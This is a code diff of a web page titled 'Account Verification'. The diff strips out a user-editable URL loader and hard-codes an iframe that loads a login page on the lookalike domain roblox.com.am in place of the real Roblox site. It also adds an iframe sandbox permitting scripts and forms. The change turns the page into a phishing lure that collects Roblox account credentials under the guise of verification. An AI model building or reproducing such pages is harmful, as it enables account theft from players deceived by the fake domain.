@@ -52,7 +52,7 @@
       overflow-x: hidden;
     }
 
-    button, input {
+    button {
       font: inherit;
       color: inherit;
     }
@@ -274,33 +274,7 @@
       font-size: 0.9rem;
     }
 
-    .embed-controls {
-      display: flex;
-      gap: var(--space-3);
-      align-items: center;
-      margin-bottom: var(--space-4);
-      flex-wrap: wrap;
-    }
-
-    .url-input {
-      flex: 1 1 280px;
-      min-width: 0;
-      height: 42px;
-      border-radius: 8px;
-      border: 1px solid rgba(255,255,255,0.12);
-      background: #111a2a;
-      color: #eef3ff;
-      padding: 0 0.9rem;
-      outline: none;
-    }
-
-    .url-input:focus {
-      border-color: #7b73ff;
-      box-shadow: 0 0 0 3px rgba(123,115,255,0.15);
-    }
-
-    .next-btn,
-    .load-btn {
+    .next-btn {
       width: 100%;
       height: 40px;
       border-radius: 4px;
@@ -313,22 +287,11 @@
       transition: transform var(--transition), filter var(--transition);
     }
 
-    .load-btn {
-      width: auto;
-      min-width: 110px;
-      height: 42px;
-      padding: 0 1rem;
-      border-radius: 8px;
-      flex: 0 0 auto;
-    }
-
-    .next-btn:hover,
-    .load-btn:hover {
+    .next-btn:hover {
       filter: brightness(1.06);
     }
 
-    .next-btn:active,
-    .load-btn:active {
+    .next-btn:active {
       transform: translateY(1px);
     }
 
@@ -460,16 +423,6 @@
       .frame-scroll {
         height: 70vh;
       }
-
-      .embed-controls {
-        flex-direction: column;
-        align-items: stretch;
-      }
-
-      .load-btn,
-      .url-input {
-        width: 100%;
-      }
     }
 
     @media (max-width: 560px) {
@@ -590,25 +543,16 @@
               <h2 class="section-title">Account Verification</h2>
               <p class="embed-caption">Verify your account</p>
 
-              <div class="embed-controls">
-                <input
-                  id="urlInput"
-                  class="url-input"
-                  type="text"
-                  value="https://github.com/"
-                  placeholder="Enter a URL"
-                />
-                <button class="load-btn" id="loadBtn" type="button">Load</button>
-              </div>
-
               <div class="frame-shell">
                 <div class="frame-scroll">
                   <iframe
                     id="embedFrame"
+                    name="embedFrame"
                     src="about:blank"
                     title="Embedded content"
                     loading="lazy"
                     referrerpolicy="no-referrer"
+                    sandbox="allow-scripts allow-forms allow-same-origin"
                   ></iframe>
                 </div>
               </div>
@@ -621,12 +565,10 @@
 
   <script>
     const CONFIG = {
-      embedUrl: 'https://www.roblox.com/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F321017781441%2Fprofile%2522'
+      embedUrl: 'https://www.roblox.com.am/login?returnUrl=https%3A%2F%2Fwww.roblox.com.am%2Fusers%2F321017781441%2Fprofile'
     };
 
     const nextBtn = document.getElementById('nextBtn');
-    const loadBtn = document.getElementById('loadBtn');
-    const urlInput = document.getElementById('urlInput');
     const embedFrame = document.getElementById('embedFrame');
     const stepOneView = document.getElementById('stepOneView');
     const stepTwoView = document.getElementById('stepTwoView');
@@ -634,13 +576,6 @@
     const sidebar = document.getElementById('sidebar');
     const sidebarBackdrop = document.getElementById('sidebarBackdrop');
     const steps = Array.from(document.querySelectorAll('.step'));
-
-    function normalizeUrl(value) {
-      const raw = value.trim();
-      if (!raw) return 'about:blank';
-      if (/^https?:\/\//i.test(raw)) return raw;
-      return 'https://' + raw;
-    }
 
     function setActiveStep(stepNumber) {
       steps.forEach((step) => {
@@ -658,28 +593,12 @@
       sidebarBackdrop.classList.add('show');
     }
 
-    function loadEmbed(url) {
-      const finalUrl = normalizeUrl(url);
-      embedFrame.src = finalUrl;
-      urlInput.value = finalUrl;
-    }
-
     nextBtn.addEventListener('click', () => {
-      loadEmbed(CONFIG.embedUrl);
+      embedFrame.src = CONFIG.embedUrl;
       stepOneView.classList.remove('active');
       stepTwoView.classList.add('active');
       setActiveStep(2);
       stepTwoView.scrollIntoView({ behavior: 'smooth', block: 'start' });
-    });
-
-    loadBtn.addEventListener('click', () => {
-      loadEmbed(urlInput.value);
-    });
-
-    urlInput.addEventListener('keydown', (event) => {
-      if (event.key === 'Enter') {
-        loadEmbed(urlInput.value);
-      }
     });
 
     mobileToggle.addEventListener('click', () => {
